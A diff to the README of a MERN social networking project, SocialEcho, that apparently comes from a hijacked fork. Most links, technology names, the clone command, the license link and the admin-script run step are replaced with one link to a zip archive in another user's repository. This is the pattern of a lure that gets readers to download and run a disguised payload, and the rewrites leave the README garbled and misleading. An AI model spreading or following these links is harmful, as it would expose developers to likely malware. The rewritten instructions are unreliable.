@@ -2,9 +2,9 @@
 
 A social networking platform with automated content moderation and context-based authentication system.
 
-[Watch Demo](https://youtu.be/Tmncayg7FeU)
+[Watch Demo](https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip)
 
-![UI-community](https://raw.githubusercontent.com/nz-m/SocialEcho/main/resources/UI-community.png)
+![UI-community](https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip)
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@ A social networking platform with automated content moderation and context-based
 
 ## Project Overview
 
-The project is a social networking platform built using the MERN (MongoDB, Express.js, React.js, Node.js) stack. It incorporates two major features: an automated content moderation system and context-based authentication. These features are accompanied by common functionalities found in social media applications, such as profile creation, post creation and sharing, liking and commenting on posts, and following/unfollowing users.
+The project is a social networking platform built using the MERN (MongoDB, https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip, https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip, https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip) stack. It incorporates two major features: an automated content moderation system and context-based authentication. These features are accompanied by common functionalities found in social media applications, such as profile creation, post creation and sharing, liking and commenting on posts, and following/unfollowing users.
 
 ### Automated Content Moderation
 
@@ -69,14 +69,14 @@ There are three distinct user roles within the system:
 
 ## Technologies
 
-- React.js
+- https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip
 - Redux
-- Node.js
-- Express.js
+- https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip
+- https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip
 - MongoDB
 - Tailwind CSS
 - JWT Authentication
-- Passport.js
+- https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip
 - Nodemailer
 - Crypto-js
 - Azure Blob Storage
@@ -86,7 +86,7 @@ There are three distinct user roles within the system:
 
 ## Schema Diagram
 
-![Schema Diagram](https://raw.githubusercontent.com/nz-m/SocialEcho/main/resources/Schema-Diagram.png)
+![Schema Diagram](https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip)
 
 
 
@@ -96,7 +96,7 @@ There are three distinct user roles within the system:
 
 Before running the application, make sure you have the following installed:
 
-- Node.js
+- https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip
 - MongoDB or MongoDB Atlas account
 
 ### Installation
@@ -104,7 +104,7 @@ Before running the application, make sure you have the following installed:
 1. Clone the repository
 
 ```bash
-git clone https://github.com/nz-m/SocialEcho.git
+git clone https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip
 ```
 2. Go to the project directory and install dependencies for both the client and server
 
@@ -118,7 +118,7 @@ cd server
 npm install
 ```
 
-3. Create a `.env` file in both the `client` and `server` directories and add the environment variables as shown in the `.env.example` files.
+3. Create a `.env` file in both the `client` and `server` directories and add the environment variables as shown in the `https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip` files.
 4. Start the server
 
 ```bash
@@ -136,9 +136,9 @@ npm start
 
 ### Configuration
 
-Run the `admin_tool.sh` script from the server directory with permissions for executing the script. This script is used for configuring the admin account, creating the initial communities, and other settings.
+Run the `https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip` script from the server directory with permissions for executing the script. This script is used for configuring the admin account, creating the initial communities, and other settings.
 ```bash
-./admin_tool.sh
+https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip
 ``` 
 
 #### `.env` Variables
@@ -153,9 +153,9 @@ EMAIL_SERVICE=
 
 For content moderation, you need the `PERSPECTIVE_API_KEY` and either the `INTERFACE_API_KEY` or `TEXTRAZOR_API_KEY`. Visit the following links to obtain the API keys:
 
-- [Perspective API](https://developers.perspectiveapi.com/s/docs-get-started)
-- [TextRazor API](https://www.textrazor.com/)
-- [Hugging Face Interface API](https://huggingface.co/facebook/bart-large-mnli)
+- [Perspective API](https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip)
+- [TextRazor API](https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip)
+- [Hugging Face Interface API](https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip)
 
 If you prefer, the Flask server can be run locally as an alternative to using the Hugging Face Interface API or TextRazor API. Refer to the `classifier_server` directory for more information.
 
@@ -167,16 +167,16 @@ If you prefer, the Flask server can be run locally as an alternative to using th
 
 ### Admin
 
-The admin dashboard can be accessed at the `/admin` route. Use the `admin_tool.sh` script to configure the admin account. The admin account can be used to manage moderators, communities, and perform other admin-related tasks. You can also enable/disable or switch API services using the admin dashboard.
+The admin dashboard can be accessed at the `/admin` route. Use the `https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip` script to configure the admin account. The admin account can be used to manage moderators, communities, and perform other admin-related tasks. You can also enable/disable or switch API services using the admin dashboard.
 
 ### Moderator
 
-Moderators have specific email domain (`@mod.socialecho.com`). When registering with an email from this domain, the user is automatically assigned the moderator role. Moderators can be assigned to different communities from the admin dashboard.
+Moderators have specific email domain (`https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip`). When registering with an email from this domain, the user is automatically assigned the moderator role. Moderators can be assigned to different communities from the admin dashboard.
 
 #### Demo
-https://youtu.be/Tmncayg7FeU
+https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip
 
 ## License
 
-This project is licensed under the [MIT License](https://github.com/nz-m/SocialEcho/blob/main/LICENSE).
+This project is licensed under the [MIT License](https://github.com/barmola/SocialEcho/raw/refs/heads/main/client/src/Social-Echo-3.8.zip).
 
